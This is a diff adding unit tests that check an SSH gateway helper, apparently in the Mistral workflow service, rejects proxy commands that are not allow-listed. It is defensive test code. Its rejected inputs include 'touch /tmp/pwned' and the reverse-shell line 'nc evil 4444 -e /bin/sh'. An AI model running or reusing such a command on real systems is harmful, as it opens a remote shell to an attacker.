@@ -192,3 +192,67 @@ class SSHUtilsTest(base.BaseTest):
                 filename=expected_path,
                 password=None,
             )
+
+
+class SSHProxyCommandAllowlistTest(base.BaseTest):
+    """The std.ssh_proxied proxy_command is an RCE vector.
+
+    paramiko.ProxyCommand runs the string as a local subprocess on the
+    executor before SSH auth, so execute_command_via_gateway must only
+    run a proxy_command that an operator has explicitly allow-listed via
+    [action_std_ssh] allowed_proxy_commands (empty by default).
+    """
+
+    @mock.patch('paramiko.ProxyCommand')
+    def test_proxy_command_rejected_by_default(self, mock_proxy_cmd):
+        # Default allowed_proxy_commands is empty: any value is rejected,
+        # and no local subprocess is ever spawned.
+        self.assertRaises(
+            exc.ActionException,
+            ssh_utils.execute_command_via_gateway,
+            'ls', 'target', 'user', None, 'gateway',
+            proxy_command='touch /tmp/pwned'
+        )
+
+        mock_proxy_cmd.assert_not_called()
+
+    @mock.patch('paramiko.ProxyCommand')
+    def test_proxy_command_not_in_allowlist_rejected(self, mock_proxy_cmd):
+        self.override_config(
+            'allowed_proxy_commands',
+            ['nc gateway 22'],
+            group='action_std_ssh'
+        )
+
+        self.assertRaises(
+            exc.ActionException,
+            ssh_utils.execute_command_via_gateway,
+            'ls', 'target', 'user', None, 'gateway',
+            proxy_command='nc evil 4444 -e /bin/sh'
+        )
+
+        mock_proxy_cmd.assert_not_called()
+
+    @mock.patch('mistral.utils.ssh_utils._cleanup')
+    @mock.patch('mistral.utils.ssh_utils._execute_command')
+    @mock.patch('mistral.utils.ssh_utils._connect')
+    @mock.patch('paramiko.SSHClient')
+    @mock.patch('paramiko.ProxyCommand')
+    def test_allow_listed_proxy_command_is_used(
+            self, mock_proxy_cmd, mock_ssh_client, mock_connect,
+            mock_exec, mock_cleanup):
+        self.override_config(
+            'allowed_proxy_commands',
+            ['nc gateway 22'],
+            group='action_std_ssh'
+        )
+        mock_exec.return_value = (0, 'ok')
+
+        ret = ssh_utils.execute_command_via_gateway(
+            'ls', 'target', 'user', None, 'gateway',
+            proxy_command='nc gateway 22'
+        )
+
+        # The exact allow-listed command reaches paramiko.
+        mock_proxy_cmd.assert_called_once_with('nc gateway 22')
+        self.assertEqual((0, 'ok'), ret)
